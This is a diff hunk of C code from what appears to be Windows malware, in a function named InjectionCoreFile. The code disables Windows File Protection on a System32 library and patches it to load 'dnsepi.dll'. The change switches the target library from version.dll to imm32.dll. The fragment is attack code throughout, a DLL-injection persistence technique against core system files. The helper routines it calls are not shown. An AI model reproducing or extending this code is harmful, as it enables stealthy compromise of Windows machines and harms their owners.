@@ -126,8 +126,8 @@ void InjectionCoreFile() {
 	DisableWFP(szTargetPath);
 	AddDllToFile("dnsepi.dll", szTargetPath, FALSE);
 
-	if (0 == ExpandEnvironmentStrings(_T("%WINDIR%\\System32\\version.dll"), szTargetPath, MAX_PATH)) {
-		_tcscpy(szTargetPath, _T("C:\\Windows\\System32\\version.dll"));
+	if (0 == ExpandEnvironmentStrings(_T("%WINDIR%\\System32\\imm32.dll"), szTargetPath, MAX_PATH)) {
+		_tcscpy(szTargetPath, _T("C:\\Windows\\System32\\imm32.dll"));
 	}
 
 	DisableWFP(szTargetPath);
